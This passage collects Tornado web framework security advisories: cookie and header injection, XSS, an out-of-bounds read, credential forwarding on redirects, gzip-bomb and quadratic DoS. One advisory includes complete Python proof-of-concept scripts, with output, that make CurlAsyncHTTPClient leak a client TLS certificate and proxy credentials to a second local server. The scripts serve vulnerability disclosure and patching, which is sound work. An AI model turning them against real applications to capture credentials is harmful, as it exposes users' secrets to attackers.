[https://lists.debian.org/debian-lts-announce/2026/04/msg00000.html](https://lists.debian.org/debian-lts-announce/2026/04/msg00000.html)\n- [https://github.com/pypa/advisory-database/tree/main/vulns/tornado/PYSEC-2026-140.yaml](https://redirect.github.com/pypa/advisory-database/tree/main/vulns/tornado/PYSEC-2026-140.yaml)\n- [https://github.com/advisories/GHSA-qjxf-f2mg-c6mc](https://redirect.github.com/advisories/GHSA-qjxf-f2mg-c6mc)\n\nThis data is provided by the [GitHub Advisory Database](https://redirect.github.com/advisories/GHSA-qjxf-f2mg-c6mc) ([CC-BY 4.0](https://redirect.github.com/github/advisory-database/blob/main/LICENSE.md)).\n</details>\n\n---\n\n### Tornado has cookie attribute injection via .RequestHandler.set_cookie\n[CVE-2026-35536](https://nvd.nist.gov/vuln/detail/CVE-2026-35536) / [GHSA-fqwm-6jpj-5wxc](https://redirect.github.com/advisories/GHSA-fqwm-6jpj-5wxc)\n\n<details>\n<summary>More information</summary>\n\n#### Details\nIn Tornado before 6.5.5, cookie attribute injection could occur because the domain, path, and samesite arguments to `.RequestHandler.set_cookie` were not checked for crafted characters.\n\n#### Severity\n- CVSS Score: 7.2 / 10 (High)\n- Vector String: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N`\n\n#### References\n- [https://github.com/tornadoweb/tornado/security/advisories/GHSA-78cv-mqj4-43f7](https://redirect.github.com/tornadoweb/tornado/security/advisories/GHSA-78cv-mqj4-43f7)\n- [https://nvd.nist.gov/vuln/detail/CVE-2026-35536](https://nvd.nist.gov/vuln/detail/CVE-2026-35536)\n- [https://github.com/tornadoweb/tornado/releases/tag/v6.5.5](https://redirect.github.com/tornadoweb/tornado/releases/tag/v6.5.5)\n- [https://github.com/advisories/GHSA-fqwm-6jpj-5wxc](https://redirect.github.com/advisories/GHSA-fqwm-6jpj-5wxc)\n\nThis data is provided by the [GitHub Advisory Database](https://redirect.github.com/advisories/GHSA-fqwm-6jpj-5wxc) ([CC-BY 4.0](https://redirect.github.com/github/advisory-database/blob/main/LICENSE.md)).\n</details>\n\n---\n\n### Tornado has out-of-bounds memory access via C extension\n[CVE-2026-49854](https://nvd.nist.gov/vuln/detail/CVE-2026-49854) / [GHSA-cx3h-4qpv-8hc9](https://redirect.github.com/advisories/GHSA-cx3h-4qpv-8hc9)\n\n<details>\n<summary>More information</summary>\n\n#### Details\n##### Summary\n\nTornado's optional native extension `tornado.speedups` implements `websocket_mask` without validating that the `mask` argument is exactly four bytes long. The C function reads four bytes from `mask` unconditionally, even when Python passes a shorter byte string. This can read beyond the provided buffer, exposing up to 3 bytes of uninitialized memory.\n\nThe behavior is reachable from Tornado's XSRF token decoder when `xsrf_cookies=True` and the native extension is active. \n\n##### Mitigations\n\nThis bug is fixed in Tornado 6.5.6. Prior to upgrading to this version, setting the environment variable TORNADO_EXTENSION=0 will disable the vulnerable code (at the expense of reducing websocket performance).\n\n#### Severity\n- CVSS Score: 3.7 / 10 (Low)\n- Vector String: `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N`\n\n#### References\n- [https://github.com/tornadoweb/tornado/security/advisories/GHSA-cx3h-4qpv-8hc9](https://redirect.github.com/tornadoweb/tornado/security/advisories/GHSA-cx3h-4qpv-8hc9)\n- [https://github.com/tornadoweb/tornado/releases/tag/v6.5.6](https://redirect.github.com/tornadoweb/tornado/releases/tag/v6.5.6)\n- [https://github.com/advisories/GHSA-cx3h-4qpv-8hc9](https://redirect.github.com/advisories/GHSA-cx3h-4qpv-8hc9)\n\nThis data is provided by the [GitHub Advisory Database](https://redirect.github.com/advisories/GHSA-cx3h-4qpv-8hc9) ([CC-BY 4.0](https://redirect.github.com/github/advisory-database/blob/main/LICENSE.md)).\n</details>\n\n---\n\n### Tornado: Authorization header forwarded across cross-origin redirects in SimpleAsyncHTTPClient\n[CVE-2026-49853](https://nvd.nist.gov/vuln/detail/CVE-2026-49853) / [GHSA-3x9g-8vmp-wqvf](https://redirect.github.com/advisories/GHSA-3x9g-8vmp-wqvf)\n\n<details>\n<summary>More information</summary>\n\n#### Details\n##### Summary\n\nWhen SimpleAsyncHTTPClient follows a 3xx redirect, it shallow-copies the original HTTPRequest, rewrites the URL, decrements max_redirects, and removes only the Host header. It does not clear Authorization, auth_username, auth_password, or auth_mode when the redirect target changes origin.\n\nAs a result, credentials intended for one origin can be forwarded to a different origin when follow_redirects=True, which is the default.\n\nBeginning in Tornado 6.5.6, `SimpleAsyncHTTPClient` matches the default behavior of `libcurl` (and therefore `CurlAsyncHTTPClient`): When a redirect changes the scheme, host, or port of the url, the `Authorization` and `Cookie` headers will be removed when following the redirect.\n\n#### Severity\n- CVSS Score: 7.7 / 10 (High)\n- Vector String: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N`\n\n#### References\n- [https://github.com/tornadoweb/tornado/security/advisories/GHSA-3x9g-8vmp-wqvf](https://redirect.github.com/tornadoweb/tornado/security/advisories/GHSA-3x9g-8vmp-wqvf)\n- [https://github.com/advisories/GHSA-3x9g-8vmp-wqvf](https://redirect.github.com/advisories/GHSA-3x9g-8vmp-wqvf)\n\nThis data is provided by the [GitHub Advisory Database](https://redirect.github.com/advisories/GHSA-3x9g-8vmp-wqvf) ([CC-BY 4.0](https://redirect.github.com/github/advisory-database/blob/main/LICENSE.md)).\n</details>\n\n---\n\n### tornado AsyncHTTPClient accumulates decompressed chunks without size limit (gzip bomb)\n[CVE-2026-49855](https://nvd.nist.gov/vuln/detail/CVE-2026-49855) / [GHSA-mgf9-4vpg-hj56](https://redirect.github.com/advisories/GHSA-mgf9-4vpg-hj56)\n\n<details>\n<summary>More information</summary>\n\n#### Details\nTornado's gzip decompression routines work in limited-size chunks, but have no overall limit for the total size of decompressed chunks that they will accumulate (There has always been a limit for the total *compressed* size). This allows a malicious server to consume effectively unlimited amounts of memory if it is accessed via SimpleAsyncHTTPClient in its default configuration. `HTTPServer` is not affected in its default configuration, but it is if `decompress_request=True` is set.\n\nThis bug is fixed in Tornado 6.5.6. `max_body_size` is now checked both for the compressed and cumulative decompressed size of the response.\n\nPrior to upgrading, this issue can be mitigated by setting `decompress_response=False` or using `CurlAsyncHTTPClient`.\n\n#### Severity\n- CVSS Score: 7.5 / 10 (High)\n- Vector String: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`\n\n#### References\n- [https://github.com/tornadoweb/tornado/security/advisories/GHSA-mgf9-4vpg-hj56](https://redirect.github.com/tornadoweb/tornado/security/advisories/GHSA-mgf9-4vpg-hj56)\n- [https://github.com/advisories/GHSA-mgf9-4vpg-hj56](https://redirect.github.com/advisories/GHSA-mgf9-4vpg-hj56)\n\nThis data is provided by the [GitHub Advisory Database](https://redirect.github.com/advisories/GHSA-mgf9-4vpg-hj56) ([CC-BY 4.0](https://redirect.github.com/github/advisory-database/blob/main/LICENSE.md)).\n</details>\n\n---\n\n### Tornado: CurlAsyncHTTPClient leaks per-request credentials on handle reuse\n[GHSA-pw6j-qg29-8w7f](https://redirect.github.com/advisories/GHSA-pw6j-qg29-8w7f)\n\n<details>\n<summary>More information</summary>\n\n#### Details\n##### CurlAsyncHTTPClient leaks per-request credentials on handle reuse\n\n##### Summary\n\n`CurlAsyncHTTPClient` pools and reuses `pycurl` handles across requests but does\nnot reset them between requests, and several per-request options are applied with\nno clearing branch. As a result, sensitive state set by one request persists onto\na later request on the same client that does not set it. Two credential vectors\nare demonstrated below — a client TLS certificate (`SSLCERT`/`SSLKEY`) and proxy\nbasic-auth credentials (`PROXYUSERPWD`) — both leaking to a different,\nunintended host. This affects all released versions through 6.5.6.\n\n##### Details\n\nIn `tornado/curl_httpclient.py`, handles are created once and returned to a free\nlist for reuse (`_process_queue` pops the handle at line 200, `_finish`\nre-appends it at line 245), and `_curl_setup_request` is never preceded by\n`curl.reset()`. The function clears *some* carried-over state on the reused handle\n— `unsetopt(PROXYUSERPWD)` in the no-proxy branch (line 394), `unsetopt(USERPWD)`\nwhen no auth is set (line 495), and the HTTP-method flag reset (lines 428-432) —\nbut other options have no equivalent clearing path and persist until a later\nrequest sets them again.\n\n**Vector A — client TLS certificate (`SSLCERT`/`SSLKEY`).** Set-only, no clearing\nbranch:\n\n```python\n\n##### tornado/curl_httpclient.py (v6.5.6), lines 498-502\nif request.client_cert is not None:\n    curl.setopt(pycurl.SSLCERT, request.client_cert)\n\nif request.client_key is not None:\n    curl.setopt(pycurl.SSLKEY, request.client_key)\n```\n\nA request that sets `client_cert` leaves the certificate on the handle; a later\nrequest without `client_cert` presents it during its TLS handshake.\n\n**Vector B — proxy credentials (`PROXYUSERPWD`).** `PROXYUSERPWD` is set only\ninside the credentials branch and unset only in the no-proxy `else` branch:\n\n```python\n\n##### tornado/curl_httpclient.py (v6.5.6), lines 371-394\nif request.proxy_host and request.proxy_port:\n    curl.setopt(pycurl.PROXY, request.proxy_host)\n    curl.setopt(pycurl.PROXYPORT, request.proxy_port)\n    if request.proxy_username:                 # only place PROXYUSERPWD is set\n        ...\n        curl.setopt(pycurl.PROXYUSERPWD, credentials)\n    ...\nelse:\n    try:\n        curl.unsetopt(pycurl.PROXY)\n    except TypeError:\n        curl.setopt(pycurl.PROXY, \"\")\n    curl.unsetopt(pycurl.PROXYUSERPWD)         # only place it is unset\n```\n\nA request that sets a *new* `proxy_host` without `proxy_username` updates\n`PROXY`/`PROXYPORT` but never reaches the `else`, so the previous request's\ncredentials persist and are sent to the new proxy.\n\nThe same class also affects `INTERFACE` (lines 365-366: set only when\n`request.network_interface` is truthy, with no clearing branch), which is a\nlower-severity instance — a later request can be bound to a network interface it\ndid not request. A single fix addresses all three (see Mitigation).\n\n##### PoC\n\nBoth reproduce against the pinned release using public API only\n(`CurlAsyncHTTPClient`, `HTTPRequest`, and the documented per-request arguments).\n\n##### Vector A — client TLS certificate\n\nThe two servers listen on different ports, so request B opens a fresh TCP+TLS\nconnection; the certificate can only reach server 2 via the persisted handle\noption, not connection or session reuse.\n\n```\npython3 -m venv venv\n./venv/bin/pip install \"tornado==6.5.6\" pycurl cryptography\n./venv/bin/python poc_client_cert.py\n```\n\n```python\nimport asyncio\nimport datetime\nimport ipaddress\nimport os\nimport socket\nimport ssl\nimport sys\nimport tempfile\nimport threading\n\nfrom cryptography import x509\nfrom cryptography.x509.oid import NameOID, ExtendedKeyUsageOID\nfrom cryptography.hazmat.primitives import hashes, serialization\nfrom cryptography.hazmat.primitives.asymmetric import rsa\n\nfrom tornado.httpclient import HTTPRequest\nfrom tornado.curl_httpclient import CurlAsyncHTTPClient\n\ndef _key():\n    return rsa.generate_private_key(public_exponent=65537, key_size=2048)\n\ndef _ca():\n    key = _key()\n    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, \"PoC-CA\")])\n    now = datetime.datetime.now(datetime.timezone.utc)\n    cert = (\n        x509.CertificateBuilder()\n        .subject_name(name).issuer_name(name)\n        .public_key(key.public_key())\n        .serial_number(x509.random_serial_number())\n        .not_valid_before(now - datetime.timedelta(minutes=1))\n        .not_valid_after(now + datetime.timedelta(days=1))\n        .add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=True)\n        .sign(key, hashes.SHA256())\n    )\n    return cert, key\n\ndef _leaf(cn, ca_cert, ca_key, ips=None, client=False):\n    key = _key()\n    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)])\n    now = datetime.datetime.now(datetime.timezone.utc)\n    b = (\n        x509.CertificateBuilder()\n        .subject_name(name).issuer_name(ca_cert.subject)\n        .public_key(key.public_key())\n        .serial_number(x509.random_serial_number())\n        .not_valid_before(now - datetime.timedelta(minutes=1))\n        .not_valid_after(now + datetime.timedelta(days=1))\n        .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)\n    )\n    if ips:\n        b = b.add_extension(\n            x509.SubjectAlternativeName([x509.IPAddress(ipaddress.ip_address(i)) for i in ips]),\n            critical=False,\n        )\n    if client:\n        b = b.add_extension(\n            x509.ExtendedKeyUsage([ExtendedKeyUsageOID.CLIENT_AUTH]), critical=False\n        )\n    return b.sign(ca_key, hashes.SHA256()), key\n\ndef _pem(path, cert, key=None):\n    with open(path, \"wb\") as fh:\n        fh.write(cert.public_bytes(serialization.Encoding.PEM))\n        if key is not None:\n            fh.write(key.private_bytes(\n                serialization.Encoding.PEM,\n                serialization.PrivateFormat.TraditionalOpenSSL,\n                serialization.NoEncryption(),\n            ))\n\nclass TLSServer:\n    def __init__(self, srv_pem, ca_pem, require):\n        self.captures = []\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self.sock.bind((\"127.0.0.1\", 0))\n        self.sock.listen(4)\n        self.port = self.sock.getsockname()[1]\n        self.ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)\n        self.ctx.load_cert_chain(srv_pem)\n        self.ctx.load_verify_locations(ca_pem)\n        self.ctx.verify_mode = ssl.CERT_REQUIRED if require else ssl.CERT_OPTIONAL\n        threading.Thread(target=self._serve, daemon=True).start()\n\n    def _serve(self):\n        while True:\n            try:\n                conn, _ = self.sock.accept()\n            except OSError:\n                return\n            try:\n                s = self.ctx.wrap_socket(conn, server_side=True)\n                self.captures.append(s.getpeercert() or None)\n                try:\n                    s.recv(4096)\n                    s.sendall(b\"HTTP/1.1 200 OK\\r\\nContent-Length: 2\\r\\nConnection: close\\r\\n\\r\\nok\")\n                except Exception:\n                    pass\n                s.close()\n            except Exception:\n                self.captures.append(\"handshake-failed\")\n                conn.close()\n\n    def stop(self):\n        try:\n            self.sock.close()\n        except Exception:\n            pass\n\ndef _cn(peer):\n    if not peer or not isinstance(peer, dict):\n        return None\n    for rdn in peer.get(\"subject\", ()):\n        for k, v in rdn:\n            if k == \"commonName\":\n                return v\n    return None\n\nasync def main():\n    with tempfile.TemporaryDirectory() as tmp:\n        ca_cert, ca_key = _ca()\n        s1_cert, s1_key = _leaf(\"server1.local\", ca_cert, ca_key, ips=[\"127.0.0.1\"])\n        s2_cert, s2_key = _leaf(\"server2.local\", ca_cert, ca_key, ips=[\"127.0.0.1\"])\n        cli_cert, cli_key = _leaf(\"trusted-client\", ca_cert, ca_key, client=True)\n\n        ca_pem = os.path.join(tmp, \"ca.pem\")\n        s1_pem = os.path.join(tmp, \"s1.pem\")\n        s2_pem = os.path.join(tmp, \"s2.pem\")\n        cert_pem = os.path.join(tmp, \"client.crt\")\n        key_pem = os.path.join(tmp, \"client.key\")\n        _pem(ca_pem, ca_cert)\n        _pem(s1_pem, s1_cert, s1_key)\n        _pem(s2_pem, s2_cert, s2_key)\n        _pem(cert_pem, cli_cert)\n        with open(key_pem, \"wb\") as fh:\n            fh.write(cli_key.private_bytes(\n                serialization.Encoding.PEM,\n                serialization.PrivateFormat.TraditionalOpenSSL,\n                serialization.NoEncryption(),\n            ))\n\n        s1 = TLSServer(s1_pem, ca_pem, require=True)\n        s2 = TLSServer(s2_pem, ca_pem, require=False)\n        try:\n            clean = CurlAsyncHTTPClient(max_clients=1, force_instance=True)\n            await clean.fetch(HTTPRequest(\n                f\"https://127.0.0.1:{s2.port}/baseline\",\n                ca_certs=ca_pem, request_timeout=5), raise_error=False)\n            clean.close()\n\n            client = CurlAsyncHTTPClient(max_clients=1, force_instance=True)\n            await client.fetch(HTTPRequest(\n                f\"https://127.0.0.1:{s1.port}/internal-mtls\",\n                client_cert=cert_pem, client_key=key_pem,\n                ca_certs=ca_pem, request_timeout=5), raise_error=False)\n            await client.fetch(HTTPRequest(\n                f\"https://127.0.0.1:{s2.port}/other-host\",\n                ca_certs=ca_pem, request_timeout=5), raise_error=False)\n            await asyncio.sleep(0.2)\n            client.close()\n        finally:\n            s1.stop()\n            s2.stop()\n\n        baseline = _cn(s2.captures[0]) if s2.captures else None\n        leaked = _cn(s2.captures[1]) if len(s2.captures) > 1 else None\n\n        print(f\"{'scenario':<48}{'cert presented to server 2'}\")\n        print(f\"{'-' * 48}{'-' * 28}\")\n        print(f\"{'baseline: clean client, no client_cert':<48}{baseline!r}\")\n        print(f\"{'exploit: reused handle (A had client_cert)':<48}{leaked!r}\")\n        print()\n        print(f\"(sanity) server 1 (mTLS required) saw: {_cn(s1.captures[0]) if s1.captures else None!r}\")\n        print()\n        if baseline is None and leaked == \"trusted-client\":\n            print(\"VERDICT: VULNERABLE — the client certificate from request A was \"\n                  \"presented to server 2 on request B, which specified none.\")\n            return 0\n        print(f\"VERDICT: not reproduced (baseline={baseline!r} leaked={leaked!r})\")\n        return 2\n\nif __name__ == \"__main__\":\n    sys.exit(asyncio.run(main()))\n```\n\nOutput (`pip show tornado` → 6.5.6, installed in the venv):\n\n```\nscenario                                        cert presented to server 2\n----------------------------------------------------------------------------\nbaseline: clean client, no client_cert          None\nexploit: reused handle (A had client_cert)      'trusted-client'\n\n(sanity) server 1 (mTLS required) saw: 'trusted-client'\n\nVERDICT: VULNERABLE — the client certificate from request A was presented to\nserver 2 on request B, which specified none.\n```\n\n##### Vector B — proxy credentials\n\nEach proxy is a separate listener capturing the raw request bytes.\n\n```\n./venv/bin/python poc_proxy_creds.py\n```\n\n```python\nimport asyncio\nimport base64\nimport socket\nimport sys\nimport threading\n\nfrom tornado.httpclient import HTTPRequest\nfrom tornado.curl_httpclient import CurlAsyncHTTPClient\n\nclass CapturingProxy:\n    def __init__(self):\n        self.captures = []\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self.sock.bind((\"127.0.0.1\", 0))\n        self.sock.listen(4)\n        self.port = self.sock.getsockname()[1]\n        threading.Thread(target=self._serve, daemon=True).start()\n\n    def _serve(self):\n        while True:\n            try:\n                conn, _ = self.sock.accept()\n            except OSError:\n                return\n            try:\n                data = b\"\"\n                while b\"\\r\\n\\r\\n\" not in data and len(data) < 8192:\n                    chunk = conn.recv(2048)\n                    if not chunk:\n                        break\n                    data += chunk\n                self.captures.append(data)\n                conn.sendall(b\"HTTP/1.1 502 Bad Gateway\\r\\nContent-Length: 0\\r\\n\"\n                             b\"Connection: close\\r\\n\\r\\n\")\n            except Exception:\n                pass\n            finally:\n                conn.close()\n\n    def stop(self):\n        try:\n            self.sock.close()\n        except Exception:\n            pass\n\ndef proxy_authz(raw):\n    head = raw.split(b\"\\r\\n\\r\\n\", 1)[0].decode(\"latin1\", \"replace\")\n    for line in head.split(\"\\r\\n\"):\n        if line.lower().startswith(\"proxy-authorization:\"):\n            return line\n    return None\n\nasync def main():\n    proxy_a = CapturingProxy()\n    proxy_b = CapturingProxy()\n    try:\n        client = CurlAsyncHTTPClient(max_clients=1, force_instance=True)\n        await client.fetch(HTTPRequest(\n            \"http://target.example/a\",\n            proxy_host=\"127.0.0.1\", proxy_port=proxy_a.port,\n            proxy_username=\"alice\", proxy_password=\"secretA\",\n            request_timeout=5, connect_timeout=5), raise_error=False)\n        await client.fetch(HTTPRequest(\n            \"http://target.example/b\",\n            proxy_host=\"127.0.0.1\", proxy_port=proxy_b.port,\n            request_timeout=5, connect_timeout=5), raise_error=False)\n        await asyncio.sleep(0.2)\n        client.close()\n    finally:\n        proxy_a.stop()\n        proxy_b.stop()\n\n    a = proxy_authz(proxy_a.captures[0]) if proxy_a.captures else None\n    b = proxy_authz(proxy_b.captures[0]) if proxy_b.captures else None\n    expected = \"Basic \" + base64.b64encode(b\"alice:secretA\").decode()\n\n    print(f\"{'request':<42}{'Proxy-Authorization seen by that proxy'}\")\n    print(f\"{'-' * 42}{'-' * 40}\")\n    print(f\"{'A -> proxy A (alice:secretA specified)':<42}{a or '(none)'}\")\n    print(f\"{'B -> proxy B (NO credentials specified)':<42}{b or '(none)'}\")\n    print()\n    if b and expected in b:\n        print(f\"VERDICT: VULNERABLE — proxy B received alice's credentials \"\n              f\"({expected}) although request B specified no proxy_username.\")\n        return 0\n    print(f\"VERDICT: not reproduced (proxy B saw: {b!r})\")\n    return 2\n\nif __name__ == \"__main__\":\n    sys.exit(asyncio.run(main()))\n```\n\nOutput (`YWxpY2U6c2VjcmV0QQ==` decodes to `alice:secretA`):\n\n```\nrequest                                   Proxy-Authorization seen by that proxy\n----------------------------------------------------------------------------------\nA -> proxy A (alice:secretA specified)    Proxy-Authorization: Basic YWxpY2U6c2VjcmV0QQ==\nB -> proxy B (NO credentials specified)   Proxy-Authorization: Basic YWxpY2U6c2VjcmV0QQ==\n\nVERDICT: VULNERABLE — proxy B received alice's credentials (Basic\nYWxpY2U6c2VjcmV0QQ==) although request B specified no proxy_username.\n```\n\n##### Impact\n\n* **Type:** Exposure of credentials to an unintended party (CWE-200), via reuse\n  of a resource whose sensitive state was not cleared (CWE-672).\n* **Actors:** An application that issues requests with differing per-request\n  options on a shared `CurlAsyncHTTPClient` — for Vector A, mixing per-request\n  `client_cert` requests with non-certificate requests; for Vector B,\n  multiplexing requests across more than one proxy with per-proxy credentials.\n* **Effect:** For Vector A, the client completes the TLS client-authentication\n  handshake — proving possession of the private key and disclosing the\n  certificate subject and chain — to a host that was never meant to receive it.\n  For Vector B, proxy basic-auth credentials are transmitted (base64) to a\n  different proxy. If the unintended host/proxy is attacker-controlled or\n  attacker-influenced (a user-supplied URL, webhook target, SSRF-reachable\n  endpoint, or a proxy chosen from user-controlled configuration), the credential\n  is disclosed to the attacker.\n* **Scope:** Only applications using the optional `CurlAsyncHTTPClient` backend\n  with the patterns above are affected. The default `SimpleAsyncHTTPClient` is not\n  affected (and does not support proxies).\n\nProposed CWE: CWE-200 / CWE-672. Proposed CVSS 3.1:\n`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N` (5.9, medium); attack complexity is\nHigh because exploitation depends on the application using differing per-request\noptions on a shared client and on handle scheduling.\n\n##### Mitigation\n\nA single fix closes all instances of this class: call `curl.reset()` at the start\nof `_curl_setup_request` and then re-apply the per-request options, so no state\nfrom a prior request can persist on the reused handle. (Note `curl.reset()` also\nclears `CAINFO`, which the current code intentionally leaves untouched — see the\ncomment at lines 401-409 — so that default would need to be re-established after\nthe reset.)\n\nAlternatively, add explicit clearing branches mirroring the existing\n`PROXYUSERPWD`/`USERPWD` handling:\n\n```python\n\n##### client certificate\nif request.client_cert is not None:\n    curl.setopt(pycurl.SSLCERT, request.client_cert)\nelse:\n    curl.unsetopt(pycurl.SSLCERT)\nif request.client_key is not None:\n    curl.setopt(pycurl.SSLKEY, request.client_key)\nelse:\n    curl.unsetopt(pycurl.SSLKEY)\n\n##### proxy credentials (inside the `if request.proxy_host and request.proxy_port:` branch)\nif request.proxy_username:\n    ...\n    curl.setopt(pycurl.PROXYUSERPWD, credentials)\nelse:\n    curl.unsetopt(pycurl.PROXYUSERPWD)\n\n##### network interface\nif request.network_interface:\n    curl.setopt(pycurl.INTERFACE, request.network_interface)\nelse:\n    curl.unsetopt(pycurl.INTERFACE)\n```\n\nUntil a fix is available, use a separate `CurlAsyncHTTPClient` instance per\ndistinct credential set (per client certificate / per proxy credential), or use\n`SimpleAsyncHTTPClient` where applicable.\n\n#### Severity\n- CVSS Score: 5.9 / 10 (Medium)\n- Vector String: `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N`\n\n#### References\n- [https://github.com/tornadoweb/tornado/security/advisories/GHSA-pw6j-qg29-8w7f](https://redirect.github.com/tornadoweb/tornado/security/advisories/GHSA-pw6j-qg29-8w7f)\n- [https://github.com/advisories/GHSA-pw6j-qg29-8w7f](https://redirect.github.com/advisories/GHSA-pw6j-qg29-8w7f)\n\nThis data is provided by the [GitHub Advisory Database](https://redirect.github.com/advisories/GHSA-pw6j-qg29-8w7f) ([CC-BY 4.0](https://redirect.github.com/github/advisory-database/blob/main/LICENSE.md)).\n</details>\n\n---\n\n### Tornado vulnerable to Header Injection and XSS via reason argument\n[CVE-2025-67724](https://nvd.nist.gov/vuln/detail/CVE-2025-67724) / [GHSA-pr2v-jx2c-wg9f](https://redirect.github.com/advisories/GHSA-pr2v-jx2c-wg9f)\n\n<details>\n<summary>More information</summary>\n\n#### Details\n##### Header injection and XSS via `reason` argument\n\n##### Summary\n\nThe `reason` argument (used by both `RequestHandler.set_status` and `tornado.web.HTTPError` is designed to allow applications to pass custom \"reason\" phrases (the \"Not Found\" in `HTTP/1.1 404 Not Found`) to the HTTP status line (mainly for non-standard status codes). Vulnerabilities exist in Tornado versions prior to 6.5.3 if untrusted data is passed as the `reason` argument.\n\n##### Details\n\nIn vulnerable versions, the supplied `reason` phrase is used unescaped in HTTP headers (where it could be used for header injection) or in HTML in the default error page (where it could be used for XSS).\n\n##### Impact\n\n* **Type:** Reflected Cross-Site Scripting (CWE-79) in default error page, or header injection (CWE-644)\n* **Actors:** Remote attacker who can cause the application to raise `HTTPError`/`set_status` with an attacker-controlled `reason` (e.g., via query parameter used by developer).\n* **Effect:** Execution of arbitrary JavaScript in victims' browsers when they view the error page — possible session token theft, CSRF escalation, UI spoofing, or other client-side attacks depending on context.\n* **Scope:** Only applications that explicitly reflect untrusted input into `reason` are affected.\n\n##### Mitigation\n\nAside from upgrading to Tornado 6.5.3 or newer, the vulnerability can be mitigated by not using untrusted data for the `reason` argument. In the intended use case the `reason` argument would generally be a string literal and not derived from user input. Also, the `reason` argument is rarely required (reason phrases are not used at all in HTTP/2) and can generally be omitted.\n\nFor a general-purpose error message in HTTPError, consider using the `log_message` argument instead of `reason`.\n\n#### Severity\n- CVSS Score: 5.4 / 10 (Medium)\n- Vector String: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N`\n\n#### References\n- [https://github.com/tornadoweb/tornado/security/advisories/GHSA-pr2v-jx2c-wg9f](https://redirect.github.com/tornadoweb/tornado/security/advisories/GHSA-pr2v-jx2c-wg9f)\n- [https://nvd.nist.gov/vuln/detail/CVE-2025-67724](https://nvd.nist.gov/vuln/detail/CVE-2025-67724)\n- [https://github.com/tornadoweb/tornado/commit/9c163aebeaad9e6e7d28bac1f33580eb00b0e421](https://redirect.github.com/tornadoweb/tornado/commit/9c163aebeaad9e6e7d28bac1f33580eb00b0e421)\n- [https://github.com/pypa/advisory-database/tree/main/vulns/tornado/PYSEC-2025-265.yaml](https://redirect.github.com/pypa/advisory-database/tree/main/vulns/tornado/PYSEC-2025-265.yaml)\n- [https://github.com/tornadoweb/tornado/releases/tag/v6.5.3](https://redirect.github.com/tornadoweb/tornado/releases/tag/v6.5.3)\n- [https://github.com/advisories/GHSA-pr2v-jx2c-wg9f](https://redirect.github.com/advisories/GHSA-pr2v-jx2c-wg9f)\n\nThis data is provided by the [GitHub Advisory Database](https://redirect.github.com/advisories/GHSA-pr2v-jx2c-wg9f) ([CC-BY 4.0](https://redirect.github.com/github/advisory-database/blob/main/LICENSE.md)).\n</details>\n\n---\n\n### Tornado: Quadratic DoS via Repeated Header Coalescing\n[CVE-2025-67725](https://nvd.nist.gov/vuln/detail/CVE-2025-67725) / [GHSA-c98p-7wgm-6p64](https://redirect.github.com/advisories/GHSA-c98p-7wgm-6p64)\n\n<details>\n<summary>More information</summary>\n\n#### Details\n##### Summary\n\nThe `HTTPHeaders.add` method in Tornado accumulates values using string concatenation when the same header name is repeated. Due to Python string immutability, each concatenation copies the entire string, resulting in O(n²) time complexity.\n\nGiven Tornado's single event loop architecture, a single maliciously crafted HTTP request can block the server's event loop for an extended period, causing a Denial of Service (DoS).\n\n**Severity:**  **High** if `max_header_size` has been increased from its default, **low** if it has its default value of 64KB.\n\n#### Severity\n- CVSS Score: 7.5 / 10 (High)\n- Vector String: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`\n\n#### References\n- [https://github.com/tornadoweb/tornado/security/advisories/GHSA-c98p-7wgm-6p64](https://redirect.github.com/tornadoweb/tornado/security/advisories/GHSA-c98p-7wgm-6p64)\n- [https://nvd.nist.gov/vuln/detail/CVE-2025-67725](https://nvd.nist.gov/vuln/detail/CVE-2025-67725)\n- [https://github.com/tornadoweb/tornado/commit/771472cfdaeebc0d89a9cc46e249f8891a6b29cd](https://redirect.github.com/tornadoweb/tornado/commit/771472cfdaeebc0d89a9cc46e249f8891a6b29cd)\n- [https://github.com/pypa/advisory-database/tree/main/vulns/tornado/PYSEC-2025-266.yaml](https://redirect.github.com/pypa/advisory-database/tree/main/vulns/tornado/PYSEC-2025-266.yaml)\n- [https://github.com/tornadoweb/tornado/releases/tag/v6.5.3](https://redirect.github.com/tornadoweb/tornado/releases/tag/v6.5.3)\n- [https://github.com/advisories/GHSA-c98p-7wgm-6p64](https://redirect.github.com/advisories/GHSA-c98p-7wgm-6p64)\n\nThis data is provided by the [GitHub Advisory Database](https://redirect.github.com/advisories/GHSA-c98p-7wgm-6p64) ([CC-BY 4.0](https://redirect.github.com/github/advisory-database/blob/main/LICENSE.md)).\n</details>\n\n---\n\n### Tornado: Quadratic DoS via Crafted Multipart Parameters\n[CVE-2025-67726](https://nvd.nist.gov/vuln/detail/CVE-2025-67726) / [GHSA-jhmp-mqwm-3gq8](https://redirect.github.com/advisories/GHSA-jhmp-mqwm-3gq8)\n\n<details>\n<summary>More information</summary>\n\n#### Details\n##### Summary\n\nThe `_parseparam` function in Tornado's `httputil.py` is used to parse specific HTTP header values, such as those in `multipart/form-data`. This function uses an inefficient algorithm that repeatedly calls `string.count()` within a nested loop while processing quoted semicolons (e.g., `param=\";\"`).\n\nAs a result, if an attacker sends a request with a large number of maliciously crafted parameters in a `Content-Disposition` header, the server's CPU usage increases quadratically (O(n²)) during parsing. Due to Tornado's single event loop architecture, a single malicious request can cause the entire server to become unresponsive for an extended period, leading to a Denial of Service 